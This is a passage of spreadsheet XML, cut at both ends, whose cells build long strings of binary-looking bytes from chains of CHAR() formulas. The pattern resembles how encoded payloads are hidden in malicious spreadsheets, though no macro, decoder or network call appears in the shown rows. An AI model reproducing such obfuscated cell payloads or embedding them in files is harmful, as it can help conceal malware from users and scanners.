_x0002_ƒîç/A_x0001__x0001_ÀSPå#_x001C__x000B__x0001_ŽÁ	ŽB(_x0015_Výq!_x0019_^_ýRJ!ÑFé_x0005_9ÇZ^Z^_É‚çR_x0004__x0002__x000D_RR^`9K7ó†B.#BWR€s"-¨_x0001__x0007_bŽ</v>
      </c>
      <c r="C97" t="str">
        <f>CHAR(48)&amp;CHAR(215)&amp;CHAR(210)&amp;CHAR(213)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(20)&amp;CHAR(236)&amp;CHAR(171)</f>
        <v>0×ÒÕô6Í_x0014_ì«</v>
      </c>
    </row>
    <row r="98" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B98" t="str">
        <f>CHAR(234)&amp;CHAR(11)&amp;CHAR(18)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(115)&amp;CHAR(138)&amp;CHAR(121)&amp;CHAR(41)&amp;CHAR(49)&amp;CHAR(128)&amp;CHAR(183)&amp;CHAR(37)&amp;CHAR(121)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(133)&amp;CHAR(200)&amp;CHAR(9)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(61)&amp;CHAR(136)&amp;CHAR(141)&amp;CHAR(46)&amp;CHAR(102)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(152)&amp;CHAR(66)&amp;CHAR(38)&amp;CHAR(83)&amp;CHAR(178)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(140)&amp;CHAR(66)&amp;CHAR(46)&amp;CHAR(63)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(34)&amp;CHAR(90)&amp;CHAR(128)&amp;CHAR(69)&amp;CHAR(32)&amp;CHAR(33)&amp;CHAR(90)&amp;CHAR(109)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(27)&amp;CHAR(80)&amp;CHAR(135)&amp;CHAR(140)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(87)&amp;CHAR(249)&amp;CHAR(90)&amp;CHAR(111)&amp;CHAR(132)&amp;CHAR(197)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(182)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(54)&amp;CHAR(193)&amp;CHAR(130)&amp;CHAR(126)&amp;CHAR(39)&amp;CHAR(55)&amp;CHAR(1)&amp;CHAR(91)&amp;CHAR(83)&amp;CHAR(4)&amp;CHAR(159)&amp;CHAR(193)&amp;CHAR(91)&amp;CHAR(140)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(26)&amp;CHAR(180)&amp;CHAR(5)&amp;CHAR(52)&amp;CHAR(226)&amp;CHAR(129)&amp;CHAR(83)&amp;CHAR(83)&amp;CHAR(6)&amp;CHAR(78)&amp;CHAR(218)&amp;CHAR(251)&amp;CHAR(149)&amp;CHAR(146)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(194)&amp;CHAR(142)&amp;CHAR(73)&amp;CHAR(39)&amp;CHAR(32)&amp;CHAR(128)&amp;CHAR(207)&amp;CHAR(5)&amp;CHAR(135)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(52)&amp;CHAR(117)&amp;CHAR(32)&amp;CHAR(25)&amp;CHAR(176)&amp;CHAR(190)&amp;CHAR(21)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(93)&amp;CHAR(80)&amp;CHAR(96)&amp;CHAR(8)&amp;CHAR(67)&amp;CHAR(87)&amp;CHAR(104)&amp;CHAR(89)&amp;CHAR(95)&amp;CHAR(9)&amp;CHAR(72)&amp;CHAR(209)&amp;CHAR(14)&amp;CHAR(178)&amp;CHAR(194)&amp;CHAR(90)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(127)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(254)&amp;CHAR(149)&amp;CHAR(135)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(195)&amp;CHAR(130)&amp;CHAR(77)&amp;CHAR(41)&amp;CHAR(37)&amp;CHAR(128)&amp;CHAR(202)&amp;CHAR(9)&amp;CHAR(136)&amp;CHAR(254)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(80)&amp;CHAR(83)&amp;CHAR(90)&amp;CHAR(92)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(150)&amp;CHAR(53)&amp;CHAR(122)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(87)&amp;CHAR(136)&amp;CHAR(132)&amp;CHAR(20)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(83)&amp;CHAR(90)&amp;CHAR(245)&amp;CHAR(145)&amp;CHAR(150)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(130)&amp;CHAR(226)&amp;CHAR(128)&amp;CHAR(249)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(193)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(44)&amp;CHAR(117)&amp;CHAR(38)&amp;CHAR(29)&amp;CHAR(115)&amp;CHAR(38)&amp;CHAR(250)&amp;CHAR(208)&amp;CHAR(1)&amp;CHAR(21)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(118)&amp;CHAR(26)&amp;CHAR(111)&amp;CHAR(7)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(37)&amp;CHAR(34)&amp;CHAR(196)&amp;CHAR(71)&amp;CHAR(33)&amp;CHAR(45)&amp;CHAR(133)&amp;CHAR(56)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(93)&amp;CHAR(111)&amp;CHAR(26)&amp;CHAR(86)&amp;CHAR(249)&amp;CHAR(155)&amp;CHAR(141)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(83)</f>
        <v>ê_x000B__x0012__x0003__x0005_ŒE&amp;sŠy)1€·%y_x0007__x0005__x0003_…È	F!=ˆ.f_x0005__x0002__x0012_˜B&amp;S²_x0007__x0004__x0003__x0004_ŒB.?‚N"Z€E !Zm_x0014__x0004__x0005__x001B_P‡Œ_x0005__x0004__x0002_	WùZo„Å_x000D_Ž¶_x0003__x0005__x0003_6Á‚~'7_x0001_[S_x0004_ŸÁ[ŒA'_x001A_´_x0005_4âSS_x0006_NÚû•’_x0011__x0006__x0002_ŒÂŽI' €Ï_x0005_‡Ž_x000B__x0006__x0002_4u _x0019_°¾_x0015__x0004__x0005_]P`_x0008_CWhY_	HÑ_x000E_²ÂZF!UPþ•‡_x0003__x0005__x000D_ŽÃ‚M)%€Ê	ˆþ_x0006__x0002__x0005_PSZ\TR–5z_x0003__x0007_
Wˆ„_x0014__x0003__x0006_
SZõ‘–_x000D__x0001__x0004_‚â€ù_x000B_Á_x0006_
_x000B_,u&amp;_x001D_s&amp;úÐ_x0001__x0015__x0002_
v_x001A_o_x0007_ˆE%"ÄG!-…8_x000B__x0001_]o_x001A_Vù›_x0006__x0002__x0005_S</v>
      </c>
      <c r="C98" t="str">
        <f>CHAR(114)&amp;CHAR(61)&amp;CHAR(251)&amp;CHAR(179)&amp;CHAR(162)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(146)&amp;CHAR(181)</f>
        <v>r=û³¢ê»ë’µ</v>
      </c>
    </row>
    <row r="99" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B99" t="str">
        <f>CHAR(83)&amp;CHAR(95)&amp;CHAR(92)&amp;CHAR(87)&amp;CHAR(251)&amp;CHAR(149)&amp;CHAR(138)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(202)&amp;CHAR(8)&amp;CHAR(129)&amp;CHAR(137)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(92)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(18)&amp;CHAR(197)&amp;CHAR(73)&amp;CHAR(37)&amp;CHAR(16)&amp;CHAR(13)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(84)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(34)&amp;CHAR(42)&amp;CHAR(91)&amp;CHAR(125)&amp;CHAR(18)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(39)&amp;CHAR(83)&amp;CHAR(242)&amp;CHAR(132)&amp;CHAR(157)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(135)&amp;CHAR(194)&amp;CHAR(113)&amp;CHAR(100)&amp;CHAR(132)&amp;CHAR(125)&amp;CHAR(37)&amp;CHAR(26)&amp;CHAR(203)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(112)&amp;CHAR(86)&amp;CHAR(93)&amp;CHAR(140)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(196)&amp;CHAR(66)&amp;CHAR(40)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(85)&amp;CHAR(132)&amp;CHAR(149)&amp;CHAR(66)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(66)&amp;CHAR(110)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(39)&amp;CHAR(80)&amp;CHAR(138)&amp;CHAR(55)&amp;CHAR(140)&amp;CHAR(117)&amp;CHAR(14)&amp;CHAR(252)&amp;CHAR(156)&amp;CHAR(150)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(196)&amp;CHAR(125)&amp;CHAR(57)&amp;CHAR(142)&amp;CHAR(23)&amp;CHAR(15)&amp;CHAR(70)&amp;CHAR(15)&amp;CHAR(114)&amp;CHAR(38)&amp;CHAR(97)&amp;CHAR(17)&amp;CHAR(105)&amp;CHAR(2)&amp;CHAR(57)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(242)&amp;CHAR(32)&amp;CHAR(87)&amp;CHAR(250)&amp;CHAR(85)&amp;CHAR(54)&amp;CHAR(139)&amp;CHAR(133)&amp;CHAR(77)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(132)&amp;CHAR(194)&amp;CHAR(119)&amp;CHAR(22)&amp;CHAR(136)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(43)&amp;CHAR(130)&amp;CHAR(117)&amp;CHAR(41)&amp;CHAR(37)&amp;CHAR(84)&amp;CHAR(252)&amp;CHAR(53)&amp;CHAR(92)&amp;CHAR(80)&amp;CHAR(249)&amp;CHAR(149)&amp;CHAR(137)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(129)&amp;CHAR(242)&amp;CHAR(81)&amp;CHAR(253)&amp;CHAR(133)&amp;CHAR(129)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(245)&amp;CHAR(115)&amp;CHAR(33)&amp;CHAR(39)&amp;CHAR(251)&amp;CHAR(146)&amp;CHAR(150)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(87)&amp;CHAR(249)&amp;CHAR(118)&amp;CHAR(41)&amp;CHAR(37)&amp;CHAR(251)&amp;CHAR(158)&amp;CHAR(154)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(128)&amp;CHAR(253)&amp;CHAR(114)&amp;CHAR(79)&amp;CHAR(244)&amp;CHAR(162)&amp;CHAR(65)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(141)&amp;CHAR(146)&amp;CHAR(91)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(135)&amp;CHAR(133)&amp;CHAR(50)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(132)&amp;CHAR(35)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(91)&amp;CHAR(227)&amp;CHAR(15)&amp;CHAR(25)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(252)&amp;CHAR(113)&amp;CHAR(32)&amp;CHAR(136)&amp;CHAR(129)&amp;CHAR(26)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(246)&amp;CHAR(125)&amp;CHAR(42)&amp;CHAR(84)&amp;CHAR(234)&amp;CHAR(197)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(206)&amp;CHAR(27)&amp;CHAR(62)&amp;CHAR(128)&amp;CHAR(12)&amp;CHAR(28)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(118)&amp;CHAR(7)&amp;CHAR(49)&amp;CHAR(149)&amp;CHAR(14)&amp;CHAR(20)&amp;CHAR(1)&amp;CHAR(4)</f>
        <v>S_\Wû•Š_x0011__x0006__x0002_‚Ê_x0008_‰_x0004__x0005__x0006_\ŽO._x0012_ÅI%_x0010__x000D_
_x0005__x0014_TˆO"*[}_x0012__x0002_	'Sò„_x0005__x0002_
‡Âqd„}%_x001A_Ë_x0003__x0005__x000D_pV]ŒI!_x0011_ÄB(_x0011__x0002__x0002__x0005__x0005_U„•B_x0003__x0002__x0012_Bn_x0007__x0007_
'PŠ7Œu_x000E_üœ–_x0006__x0002__x000D_„Ä}9Ž_x0017__x000F_F_x000F_r&amp;a_x0011_i_x0002_9_x0007__x0006_ò WúU6‹…M_x0004__x0005__x0001_„Âw_x0016_ˆA!+‚u)%Tü5\Pù•‰_x0005__x0005_	òQý…_x0006__x0002__x0007_õs!'û’–
_x0003__x000B_Wùv)%ûžš_x0005__x0014__x0004_€ýrOô¢A_x0005_	_x0007_’[_x0006__x0005__x0002_‡…2_x0002__x0003__x0005_RQ„#_x0002__x000D__x0005_[ã_x000F__x0019__x0005__x0005_üq ˆ_x001A__x0003__x0005__x0005_ö}*TêÅ_x0003__x0006__x0002_„Î_x001B_&gt;€_x000C__x001C__x0006_
v_x0007_1•_x000E__x0014__x0001__x0004_</v>
      </c>
      <c r="C99" t="str">
        <f>CHAR(127)&amp;CHAR(50)&amp;CHAR(232)&amp;CHAR(195)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(181)&amp;CHAR(119)&amp;CHAR(246)</f>
        <v>2èÃ»ë÷µwö</v>
      </c>
    </row>
    <row r="100" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B100" t="str">
        <f>CHAR(124)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(210)&amp;CHAR(239)&amp;CHAR(7)&amp;CHAR(56)&amp;CHAR(198)&amp;CHAR(85)&amp;CHAR(85)&amp;CHAR(78)&amp;CHAR(128)&amp;CHAR(198)&amp;CHAR(81)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(208)&amp;CHAR(128)&amp;CHAR(233)&amp;CHAR(222)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(86)&amp;CHAR(86)&amp;CHAR(83)&amp;CHAR(138)&amp;CHAR(181)&amp;CHAR(38)&amp;CHAR(243)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(101)&amp;CHAR(61)&amp;CHAR(134)&amp;CHAR(65)&amp;CHAR(43)&amp;CHAR(123)&amp;CHAR(131)&amp;CHAR(204)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(231)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(54)&amp;CHAR(50)&amp;CHAR(143)&amp;CHAR(93)&amp;CHAR(10)&amp;CHAR(148)&amp;CHAR(221)&amp;CHAR(13)&amp;CHAR(131)&amp;CHAR(221)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(26)&amp;CHAR(57)&amp;CHAR(209)&amp;CHAR(8)&amp;CHAR(204)&amp;CHAR(143)&amp;CHAR(86)&amp;CHAR(41)&amp;CHAR(17)&amp;CHAR(141)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(33)&amp;CHAR(159)&amp;CHAR(67)&amp;CHAR(37)&amp;CHAR(8)&amp;CHAR(192)&amp;CHAR(131)&amp;CHAR(79)&amp;CHAR(49)&amp;CHAR(21)&amp;CHAR(137)&amp;CHAR(78)&amp;CHAR(35)&amp;CHAR(5)&amp;CHAR(203)&amp;CHAR(154)&amp;CHAR(69)&amp;CHAR(33)&amp;CHAR(34)&amp;CHAR(129)&amp;CHAR(69)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(197)&amp;CHAR(143)&amp;CHAR(9)&amp;CHAR(133)&amp;CHAR(203)&amp;CHAR(119)&amp;CHAR(41)&amp;CHAR(142)&amp;CHAR(121)&amp;CHAR(33)&amp;CHAR(27)&amp;CHAR(134)&amp;CHAR(149)&amp;CHAR(41)&amp;CHAR(237)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(39)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(37)&amp;CHAR(67)&amp;CHAR(141)&amp;CHAR(5)&amp;CHAR(8)&amp;CHAR(66)&amp;CHAR(142)&amp;CHAR(10)&amp;CHAR(150)&amp;CHAR(216)&amp;CHAR(115)&amp;CHAR(240)&amp;CHAR(142)&amp;CHAR(126)&amp;CHAR(35)&amp;CHAR(21)&amp;CHAR(136)&amp;CHAR(176)&amp;CHAR(33)&amp;CHAR(242)&amp;CHAR(11)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(82)&amp;CHAR(38)&amp;CHAR(29)&amp;CHAR(254)&amp;CHAR(176)&amp;CHAR(45)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(136)&amp;CHAR(143)&amp;CHAR(34)&amp;CHAR(230)&amp;CHAR(11)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(196)&amp;CHAR(141)&amp;CHAR(19)&amp;CHAR(234)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(253)&amp;CHAR(190)&amp;CHAR(38)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(81)&amp;CHAR(233)&amp;CHAR(15)&amp;CHAR(17)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(47)&amp;CHAR(130)&amp;CHAR(201)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(34)&amp;CHAR(24)&amp;CHAR(134)&amp;CHAR(198)&amp;CHAR(254)&amp;CHAR(140)&amp;CHAR(81)&amp;CHAR(33)&amp;CHAR(21)&amp;CHAR(135)&amp;CHAR(6)&amp;CHAR(156)&amp;CHAR(139)&amp;CHAR(86)&amp;CHAR(53)&amp;CHAR(22)&amp;CHAR(253)&amp;CHAR(179)&amp;CHAR(46)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(14)&amp;CHAR(245)&amp;CHAR(183)&amp;CHAR(47)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(202)&amp;CHAR(88)&amp;CHAR(226)&amp;CHAR(217)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(56)&amp;CHAR(66)&amp;CHAR(46)&amp;CHAR(47)&amp;CHAR(150)&amp;CHAR(197)&amp;CHAR(14)&amp;CHAR(58)&amp;CHAR(83)&amp;CHAR(34)&amp;CHAR(17)&amp;CHAR(40)&amp;CHAR(133)&amp;CHAR(33)&amp;CHAR(250)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(112)&amp;CHAR(10)&amp;CHAR(62)</f>
        <v>|_x000E_ŽÒï_x0007_8ÆUUN€ÆQ_x0005__x0006__x000D_Ð€éÞ_x000B__x0002__x0002_VVSŠµ&amp;ó_x0002__x0005__x000D_R€e=†A+{ƒÌ
‚ç_x0005__x0005__x0005_„62]
”Ý_x000D_ƒÝ_x0007__x0005__x0003_B_x001A_9Ñ_x0008_ÌV)_x0011_M.!ŸC%_x0008_ÀƒO1_x0015_‰N#_x0005_ËšE!"E_x000E__x0006_Å	…Ëw)Žy!_x001B_†•)í_x0005__x0003__x0006_'Õ†Ë%C_x0005__x0008_BŽ
–ØsðŽ~#_x0015_ˆ°!ò_x000B__x0003__x000B_R&amp;_x001D_þ°-_x000E__x0007__x0014__x0004_ˆ"æ_x000B__x0015__x0001_Ä_x0013_ê_x000D__x0013__x0001__x0005_ý¾&amp;_x0006__x0007__x0003__x0005_Qé_x000F__x0011__x0003__x0005_„A//‚É	ŽG"_x0018_†ÆþŒQ!_x0015_‡_x0006_œ‹V5_x0016_ý³._x0003__x0007__x0003__x0004_Ž_x000E_õ·/_x000E__x0004__x0002__x000D__x0002_ÊXâÙ_x0005__x0004__x0005_8B./–Å_x000E_:S"_x0011_(…!ú_x000B__x0002__x0002_p
&gt;</v>
      </c>
      <c r="C100" t="str">
        <f>CHAR(181)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(235)&amp;CHAR(191)&amp;CHAR(118)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(129)&amp;CHAR(96)</f>
        <v>µ£0ë¿vôS`</v>
      </c>
    </row>
    <row r="101" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B101" t="str">
        <f>CHAR(149)&amp;CHAR(37)&amp;CHAR(254)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(121)&amp;CHAR(24)&amp;CHAR(128)&amp;CHAR(79)&amp;CHAR(37)&amp;CHAR(29)&amp;CHAR(134)&amp;CHAR(237)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(72)&amp;CHAR(33)&amp;CHAR(22)&amp;CHAR(129)&amp;CHAR(238)&amp;CHAR(4)&amp;CHAR(112)&amp;CHAR(178)&amp;CHAR(57)&amp;CHAR(194)&amp;CHAR(91)&amp;CHAR(92)&amp;CHAR(79)&amp;CHAR(74)&amp;CHAR(135)&amp;CHAR(198)&amp;CHAR(219)&amp;CHAR(11)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(192)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(42)&amp;CHAR(136)&amp;CHAR(71)&amp;CHAR(46)&amp;CHAR(34)&amp;CHAR(13)&amp;CHAR(186)&amp;CHAR(69)&amp;CHAR(92)&amp;CHAR(247)&amp;CHAR(129)&amp;CHAR(9)&amp;CHAR(149)&amp;CHAR(7)&amp;CHAR(203)&amp;CHAR(48)&amp;CHAR(201)&amp;CHAR(120)&amp;CHAR(118)&amp;CHAR(158)&amp;CHAR(69)&amp;CHAR(44)&amp;CHAR(117)&amp;CHAR(4)&amp;CHAR(193)&amp;CHAR(54)&amp;CHAR(219)&amp;CHAR(114)&amp;CHAR(118)&amp;CHAR(49)&amp;CHAR(216)&amp;CHAR(58)&amp;CHAR(19)&amp;CHAR(113)&amp;CHAR(29)&amp;CHAR(136)&amp;CHAR(125)&amp;CHAR(37)&amp;CHAR(42)&amp;CHAR(136)&amp;CHAR(242)&amp;CHAR(46)&amp;CHAR(244)&amp;CHAR(134)&amp;CHAR(241)&amp;CHAR(55)&amp;CHAR(114)&amp;CHAR(28)&amp;CHAR(143)&amp;CHAR(3)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(59)&amp;CHAR(133)&amp;CHAR(56)&amp;CHAR(44)&amp;CHAR(113)&amp;CHAR(2)&amp;CHAR(71)&amp;CHAR(79)&amp;CHAR(138)&amp;CHAR(60)&amp;CHAR(4)&amp;CHAR(119)&amp;CHAR(248)&amp;CHAR(214)&amp;CHAR(66)&amp;CHAR(22)&amp;CHAR(46)&amp;CHAR(110)&amp;CHAR(107)&amp;CHAR(105)&amp;CHAR(3)&amp;CHAR(70)&amp;CHAR(6)&amp;CHAR(204)&amp;CHAR(57)&amp;CHAR(209)&amp;CHAR(51)&amp;CHAR(27)&amp;CHAR(114)&amp;CHAR(21)&amp;CHAR(128)&amp;CHAR(117)&amp;CHAR(32)&amp;CHAR(97)&amp;CHAR(33)&amp;CHAR(244)&amp;CHAR(151)&amp;CHAR(254)&amp;CHAR(122)&amp;CHAR(120)&amp;CHAR(10)&amp;CHAR(128)&amp;CHAR(10)&amp;CHAR(87)&amp;CHAR(137)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(70)&amp;CHAR(134)&amp;CHAR(52)&amp;CHAR(19)&amp;CHAR(116)&amp;CHAR(234)&amp;CHAR(137)&amp;CHAR(190)&amp;CHAR(38)&amp;CHAR(242)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(43)&amp;CHAR(83)&amp;CHAR(195)&amp;CHAR(73)&amp;CHAR(17)&amp;CHAR(103)&amp;CHAR(11)&amp;CHAR(254)&amp;CHAR(91)&amp;CHAR(53)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(114)&amp;CHAR(1)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(38)&amp;CHAR(109)&amp;CHAR(84)&amp;CHAR(85)&amp;CHAR(246)&amp;CHAR(92)&amp;CHAR(54)&amp;CHAR(143)&amp;CHAR(202)&amp;CHAR(249)&amp;CHAR(19)&amp;CHAR(53)&amp;CHAR(203)&amp;CHAR(140)&amp;CHAR(203)&amp;CHAR(238)&amp;CHAR(94)&amp;CHAR(252)&amp;CHAR(251)&amp;CHAR(250)&amp;CHAR(80)&amp;CHAR(129)&amp;CHAR(119)&amp;CHAR(47)&amp;CHAR(6)&amp;CHAR(81)&amp;CHAR(49)&amp;CHAR(242)&amp;CHAR(138)&amp;CHAR(74)&amp;CHAR(17)&amp;CHAR(143)&amp;CHAR(204)&amp;CHAR(96)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(10)&amp;CHAR(87)&amp;CHAR(245)&amp;CHAR(91)&amp;CHAR(29)&amp;CHAR(136)&amp;CHAR(124)&amp;CHAR(17)&amp;CHAR(140)&amp;CHAR(72)&amp;CHAR(17)&amp;CHAR(150)&amp;CHAR(200)&amp;CHAR(113)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(3)&amp;CHAR(83)&amp;CHAR(250)&amp;CHAR(83)&amp;CHAR(13)&amp;CHAR(136)&amp;CHAR(127)&amp;CHAR(30)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(17)&amp;CHAR(136)&amp;CHAR(204)&amp;CHAR(127)&amp;CHAR(2)&amp;CHAR(138)&amp;CHAR(12)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(83)&amp;CHAR(14)&amp;CHAR(133)&amp;CHAR(123)&amp;CHAR(18)&amp;CHAR(137)&amp;CHAR(75)&amp;CHAR(21)&amp;CHAR(128)&amp;CHAR(192)&amp;CHAR(126)&amp;CHAR(11)&amp;CHAR(143)</f>
        <v>•%þ_x0002__x0003__x0005_y_x0018_€O%_x001D_†í_x0007_H!_x0016_î_x0004_p²9Â[\OJ‡ÆÛ_x000B__x0007__x0005_ÀA"*ˆG."_x000D_ºE\÷	•_x0007_Ë0ÉxvžE,u_x0004_Á6Ûrv1Ø:_x0013_q_x001D_ˆ}%*ˆò.ô†ñ7r_x001C__x0003_‹_x0002_;…8,q_x0002_GOŠ&lt;_x0004_wøÖB_x0016_.nki_x0003_F_x0006_Ì9Ñ3_x001B_r_x0015_€u a!ô—þzx
€
W‰_x0006__x0007_F†4_x0013_tê‰¾&amp;ò_x0004__x0003__x0005_ŒE&amp;+SÃI_x0011_g_x000B_þ[5€Ãr_x0001_ˆJ&amp;mTUö\6Êù_x0013_5ËŒËî^üûúPw/_x0006_Q1òŠJ_x0011_Ì`_x000D_Ž
Wõ[_x001D_ˆ|_x0011_ŒH_x0011_–Èq_x000B__x0003_SúS_x000D_ˆ_x001E_ˆM_x0011_ˆÌ_x0002_Š_x000C_TúS_x000E_…{_x0012_‰K_x0015_€À~_x000B_</v>
      </c>
      <c r="C101" t="str">
        <f>CHAR(191)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(132)&amp;CHAR(106)&amp;CHAR(123)&amp;CHAR(123)</f>
        <v>¿Îßýô6„j{{</v>
      </c>
    </row>
    <row r="102" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B102" t="str">
